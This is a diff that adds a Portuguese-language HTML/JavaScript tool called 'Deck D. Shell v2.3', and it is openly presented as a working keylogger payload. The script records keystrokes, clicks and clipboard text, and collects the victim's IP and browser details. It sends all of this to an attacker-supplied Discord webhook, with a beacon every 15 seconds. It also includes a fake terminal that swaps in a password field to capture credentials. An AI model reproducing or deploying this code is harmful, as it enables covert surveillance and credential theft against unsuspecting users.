@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Deck D. Shell v2.3 - Configuração</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Courier New', monospace; 
+            background: linear-gradient(45deg, #000, #001100); 
+            color: #00ff00; 
+            margin: 0; 
+            padding: 20px; 
+            height: 100vh; 
+            overflow: hidden;
+        }
+        .container { max-width: 900px; margin: 0 auto; }
+        .header { 
+            text-align: center; 
+            font-size: 28px; 
+            margin-bottom: 30px; 
+            animation: glow 2s infinite;
+            letter-spacing: 2px;
+        }
+        @keyframes glow { 
+            0%, 100% { text-shadow: 0 0 10px #00ff00; } 
+            50% { text-shadow: 0 0 25px #00ff00, 0 0 35px #00ff00; } 
+        }
+        .panel { 
+            background: rgba(17,17,17,0.95); 
+            padding: 25px; 
+            border: 2px solid #00ff00; 
+            margin: 15px 0; 
+            border-radius: 8px; 
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 20px rgba(0,255,0,0.3);
+        }
+        .input-group { margin: 15px 0; }
+        .input { 
+            width: 100%; 
+            padding: 15px; 
+            background: rgba(0,0,0,0.8); 
+            color: #00ff00; 
+            border: 2px solid #00ff00; 
+            font-family: inherit;
+            font-size: 16px;
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+        .input:focus { 
+            outline: none; 
+            box-shadow: 0 0 15px #00ff00;
+            border-color: #00ff41;
+        }
+        .btn { 
+            padding: 12px 25px; 
+            background: transparent; 
+            color: #00ff00; 
+            border: 2px solid #00ff00; 
+            font-family: inherit;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn:hover { 
+            background: #00ff00; 
+            color: #000; 
+            box-shadow: 0 0 20px #00ff00;
+            transform: translateY(-2px);
+        }
+        .btn:active { transform: translateY(0); }
+        .btn-danger { border-color: #ff0040; color: #ff0040; }
+        .btn-danger:hover { background: #ff0040; color: #000; }
+        .btn-success { border-color: #00ff41; color: #00ff41; }
+        .btn-success:hover { background: #00ff41; color: #000; }
+        .hidden { display: none; }
+        .status { 
+            padding: 15px; 
+            border-radius: 5px; 
+            margin: 10px 0;
+            text-align: center;
+            font-weight: bold;
+        }
+        .status.success { background: rgba(0,255,65,0.2); border: 1px solid #00ff41; }
+        .status.error { background: rgba(255,0,64,0.2); border: 1px solid #ff0040; }
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+            opacity: 0.1;
+        }
+        .config-section, .payload-section { transition: opacity 0.5s; }
+        .payload-ready { animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.8; } }
+        .terminal { 
+            background: rgba(0,0,0,0.5); 
+            border: 1px solid #00ff00; 
+            padding: 15px; 
+            height: 150px; 
+            overflow-y: auto; 
+            font-size: 14px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        .terminal-line { margin: 2px 0; }
+        .blink { animation: blink 1s infinite; }
+        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0.3; } }
+        .prompt { color: #00ff41; }
+    </style>
+</head>
+<body>
+    <canvas class="matrix-bg" id="matrix"></canvas>
+    
+    <div class="container">
+        <div class="header">⚙️ Deck D. Shell v2.3 - Configuração Interativa</div>
+        
+        <!-- Painel de Configuração -->
+        <div id="configPanel" class="panel config-section">
+            <h3>🔗 Configurar Webhook Discord</h3>
+            <div class="input-group">
+                <label>Webhook URL Completo:</label>
+                <input type="url" class="input" id="webhookInput" placeholder="https://discord.com/api/webhooks/ID/TOKEN">
+                <small>Exemplo: https://discord.com/api/webhooks/123456789/abcDEFghiJKLmnopQRST</small>
+            </div>
+            
+            <div class="input-group">
+                <button class="btn btn-success" onclick="testWebhook()">🧪 Testar Conexão</button>
+                <button class="btn btn-success" onclick="deployPayload()">🚀 Implantar Payload</button>
+                <button class="btn" onclick="generateWebhook()">🔄 Gerar Novo Webhook</button>
+            </div>
+            
+            <div id="statusMsg"></div>
+        </div>
+
+        <!-- Payload Principal (escondido inicialmente) -->
+        <div id="payloadPanel" class="panel payload-section hidden payload-ready">
+            <h3>✅ Payload Ativo - Deck D. Shell v2.3</h3>
+            <div id="status" class="status success">
+                Monitoramento ativo | Keylogger: ON | Beacon: 15s | <span id="keyCount">0</span> teclas
+            </div>
+            
+            <div id="terminal" class="terminal">
+                <div class="terminal-line">Deck D. Shell> <span class="prompt">✓</span> Configuração carregada.</div>
+                <div class="terminal-line">Deck D. Shell> <span class="prompt">✓</span> Keylogger implantado. Captura ativa.</div>
+                <div class="terminal-line">Deck D. Shell> <span class="prompt">✓</span> Beacon estabelecido: <span id="beaconStatus">ativo</span></div>
+                <div class="terminal-line blink">Deck D. Shell> Digite comandos de diagnóstico...</div>
+            </div>
+            
+            <input type="text" class="input" id="fakeInput" placeholder="scan /net /sys /diag > Enter comandos..." autocomplete="off" autocapitalize="off" spellcheck="false">
+            <input type="password" class="input hidden" id="passInput" placeholder="Campo seguro ativo - digite credenciais...">
+            
+            <div style="margin-top: 20px; text-align: center;">
+                <button class="btn btn-danger" onclick="stopPayload()">🛑 Parar Payload</button>
+                <button class="btn" onclick="showStats()">📊 Estatísticas</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Deck D. Shell v2.3 - COMPLETO E FUNCIONAL
+        class DeckDShell {
+            constructor(webhookUrl) {
+                this.webhook = webhookUrl;
+                this.keystrokes = [];
+                this.mouseClicks = [];
+                this.clipboardHistory = [];
+                this.sessionData = {};
+                this.lastFlush = 0;
+                this.isActive = false;
+                this.terminalLines = [];
+                this.init();
+            }
+
+            async init() {
+                this.matrixEffect();
+                await this.grabIP();
+                await this.collectSystemInfo();
+                this.deployKeylogger();
+                this.monitorActivity();
+                this.showFakeUI();
+                this.addTerminalLine('✓ Inicialização completa');
+                this.isActive = true;
+                this.beaconInterval = setInterval(() => this.sendBeacon(), 15000);
+            }
+
+            matrixEffect() {
+                const canvas = document.getElementById('matrix');
+                const ctx = canvas.getContext('2d');
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                
+                const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
+                const fontSize = 14;
+                const columns = canvas.width / fontSize;
+                const drops = Array(Math.floor(columns)).fill(1);
+                
+                function draw() {
+                    ctx.fillStyle = 'rgba(0, 20, 0, 0.05)';
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                    ctx.fillStyle = '#00ff00';
+                    ctx.font = fontSize + 'px monospace';
+                    
+                    for (let i = 0; i < drops.length; i++) {
+                        const text = chars[Math.floor(Math.random() * chars.length)];
+                        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975)
+                            drops[i] = 0;
+                        drops[i]++;
+                    }
+                }
+                setInterval(draw, 50);
+            }
+
+            async grabIP() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    this.sessionData.ip = data.ip;
+                    this.addTerminalLine(`✓ IP detectado: ${data.ip}`);
+                } catch (e) {
+                    this.sessionData.ip = 'N/A';
+                }
+            }
+
+            async collectSystemInfo() {
+                this.sessionData.ua = navigator.userAgent;
+                this.sessionData.language = navigator.language;
+                this.sessionData.platform = navigator.platform;
+                this.sessionData.screen = `${screen.width}x${screen.height}`;
+                this.sessionData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                this.addTerminalLine('✓ Dados do sistema coletados');
+            }
+
+            deployKeylogger() {
+                document.addEventListener('keydown', (e) => this.captureKeystroke(e));
+                document.addEventListener('click', (e) => this.captureClick(e));
+                document.addEventListener('copy', () => this.captureClipboard());
+                this.addTerminalLine('✓ Keylogger ativo');
+            }
+
+            captureKeystroke(e) {
+                const keyData = {
+                    event: e.type,
+                    key: e.key || String.fromCharCode(e.keyCode || e.which),
+                    code: e.code,
+                    shift: e.shiftKey,
+                    ctrl: e.ctrlKey,
+                    alt: e.altKey,
+                    meta: e.metaKey,
+                    timestamp: Date.now(),
+                    target: {
+                        tag: e.target.tagName,
+                        id: e.target.id || '',
+                        class: e.target.className || '',
+                        name: e.target.name || ''
+                    }
+                };
+                this.keystrokes.push(keyData);
+                if (this.keystrokes.length % 50 === 0) {
+                    this.flushKeystrokes();
+                }
+            }
+
+            captureClick(e) {
+                this.mouseClicks.push({
+                    x: e.clientX,
+                    y: e.clientY,
+                    target: e.target.tagName,
+                    timestamp: Date.now()
+                });
+            }
+
+            captureClipboard() {
+                navigator.clipboard.readText().then(text => {
+                    this.clipboardHistory.push({
+                        content: text.substring(0, 100),
+                        timestamp: Date.now()
+                    });
+                }).catch(() => {});
+            }
+
+            monitorActivity() {
+                setInterval(() => {
+                    if (this.keystrokes.length > this.lastFlush) {
+                        this.flushKeystrokes();
+                    }
+                }, 5000);
+            }
+
+            showFakeUI() {
+                const fakeInput = document.getElementById('fakeInput');
+                fakeInput.addEventListener('input', (e) => {
+                    if (e.target.value.includes('pass') || e.target.value.includes('login')) {
+                        document.getElementById('passInput').classList.remove('hidden');
+                        fakeInput.classList.add('hidden');
+                    }
+                });
+            }
+
+            addTerminalLine(message) {
+                this.terminalLines.push(`Deck D. Shell> ${message}`);
+                const terminal = document.getElementById('terminal');
+                const div = document.createElement('div');
+                div.className = 'terminal-line';
+                div.textContent = `Deck D. Shell> ${message}`;
+                terminal.appendChild(div);
+                terminal.scrollTop = terminal.scrollHeight;
+                
+                if (terminal.children.length > 10) {
+                    terminal.removeChild(terminal.firstChild);
+                }
+            }
+
+            async sendBeacon() {
+                const payload = {
+                    type: 'beacon',
+                    keystrokes: this.keystrokes.length - this.lastFlush,
+                    session: this.sessionData,
+                    timestamp: Date.now()
+                };
+                
+                try {
+                    await fetch(this.webhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    this.lastFlush = this.keystrokes.length;
+                    document.getElementById('beaconStatus').textContent = 'ativo';
+                } catch (e) {
+                    document.getElementById('beaconStatus').textContent = 'erro';
+                }
+            }
+
+            async flushKeystrokes() {
+                if (this.keystrokes.length === this.lastFlush) return;
+                
+                const payload = {
+                    type: 'keystrokes',
+                    data: this.keystrokes.slice(this.lastFlush),
+                    total: this.keystrokes.length,
+                    session: this.sessionData,
+                    timestamp: Date.now()
+                };
+
+                try {
+                    await fetch(this.webhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    this.lastFlush = this.keystrokes.length;
+                    this.addTerminalLine(`✓ Enviado: ${payload.data.length} teclas`);
+                } catch (e) {
+                    this.addTerminalLine('✗ Erro no envio');
+                }
+            }
+        }
+
+        let shellInstance = null;
+        let WEBHOOK_URL = '';
+
+        // Funções Interativas
+        async function testWebhook() {
+            const webhook = document.getElementById('webhookInput').value.trim();
+            if (!webhook) {
+                showStatus('❌ Insira um webhook válido', 'error');
+                return;
+            }
+
+            // Validação básica do formato Discord webhook
+            if (!webhook.includes('discord.com/api/webhooks/') || !webhook.includes('/')) {
+                showStatus('❌ Formato de webhook Discord inválido', 'error');
+                return;
+            }
+
+            showStatus('🧪 Testando conexão...', '');
+            
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 10000);
+
+                const response = await fetch(webhook, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'User-Agent': 'DeckDShell/2.3'
+                    },
+                    body: JSON.stringify({
+                        content: 'Deck D. Shell v2.3 - 🧪 Teste de conexão OK',
+                        embeds: [{
+                            title: 'Conexão Estabelecida',
+                            color: 0x00ff00,
+                            fields: [
+                                { name: 'Status', value: '✅ ONLINE', inline: true },
+                                { name: 'Versão', value: 'v2.3', inline: true },
+                                { name: 'Timestamp', value: new Date().toISOString(), inline: false }
+                            ]
+                        }]
+                    }),
+                    signal: controller.signal
+                });
+
+                clearTimeout(timeout);
+
+                if (response.ok) {
+                    WEBHOOK_URL = webhook;
+                    showStatus('✅ Webhook funcionando perfeitamente! 🚀 Pronto para deploy', 'success');
+                } else {
+                    const errorText = await response.text();
+                    showStatus(`❌ HTTP ${response.status}: ${errorText.substring(0, 100)}`, 'error');
+                }
+            } catch (error) {
+                if (error.name === 'AbortError') {
+                    showStatus('❌ Timeout na conexão (10s)', 'error');
+                } else {
+                    showStatus(`❌ Falha: ${error.message}`, 'error');
+                }
+            }
+        }
+
+        function deployPayload() {
+            const webhook = document.getElementById('webhookInput').value.trim();
+            if (!webhook || !WEBHOOK_URL) {
+                showStatus('❌ Teste a conexão primeiro com o botão 🧪!', 'error');
+                return;
+            }
+
+            showStatus('🚀 Implantando payload completo...', 'success');
+            
+            setTimeout(() => {
+                document.getElementById('configPanel').classList.add('hidden');
+                document.getElementById('payloadPanel').classList.remove('hidden');
+                
+                shellInstance = new DeckDShell(WEBHOOK_URL);
+                
+                showStatus('✅ Payload ativo! Monitoramento completo.', 'success');
+            }, 1500);
+        }
+
+        function generateWebhook() {
+            const example = 'https://discord.com/api/webhooks/123456789/abcDEF123ghiJKL456mnopQRST789';
+            document.getElementById('webhookInput').value = example;
+            document.getElementById('webhookInput').select();
+            document.getElementById('webhookInput').focus();
+            showStatus('📋 1. Crie webhook no Discord > 2. Cole URL real > 3. Teste conexão', 'success');
+        }
+
+        function stopPayload() {
+            if (shellInstance) {
+                shellInstance.isActive = false;
+                clearInterval(shellInstance.beaconInterval);
+                shellInstance.flushKeystrokes();
+            }
+            document.getElementById('payloadPanel').classList.add('hidden');
+            document.getElementById('configPanel').classList.remove('hidden');
+            showStatus('🛑 Payload parado. Configure novamente se necessário.', 'success');
+        }
+
+        function showStats() {
+            if (!shellInstance) return;
+            
+            const stats = `📊
+• Teclas capturadas: ${shellInstance.keystrokes.length}
+• Cliques: ${shellInstance.mouseClicks.length}
+• Clipboard: ${shellInstance.clipboardHistory.length}
+• IP: ${shellInstance.sessionData.ip || 'Coleta...'}
+• Tela: ${shellInstance.sessionData.screen || 'N/A'}
+• UA: ${shellInstance.sessionData.ua?.substring(0, 50) || 'N/A'}...
+• Último envio: ${new Date(shellInstance.lastFlush).toLocaleTimeString()}
+• Beacon: ${document.getElementById('beaconStatus')?.textContent || 'N/A'}`;
+
+            const terminal = document.getElementById('terminal');
+            const statsDiv = document.createElement('div');
+            statsDiv.style.cssText = 'background: rgba(0,255,0,0.1); padding: 10px; border-radius: 3px; margin: 5px 0; white-space: pre-wrap;';
+            statsDiv.textContent = stats;
+            terminal.appendChild(statsDiv);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function showStatus(message, type) {
+            const statusEl = document.getElementById('statusMsg');
+            statusEl.innerHTML = message;
+            statusEl.className = `status ${type}`;
+        }
+
+        // Inicialização
+        window.addEventListener('load', () => {
+            generateWebhook();
+            document.getElementById('webhookInput').focus();
+        });
+
+        // Hotkeys
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey && e.shiftKey && e.key === 'D') {
+                testWebhook();
+            }
+            if (e.ctrlKey && e.shiftKey && e.key === 'P') {
+                deployPayload();
+            }
+        });
+    </script>
+</body>
+</html>
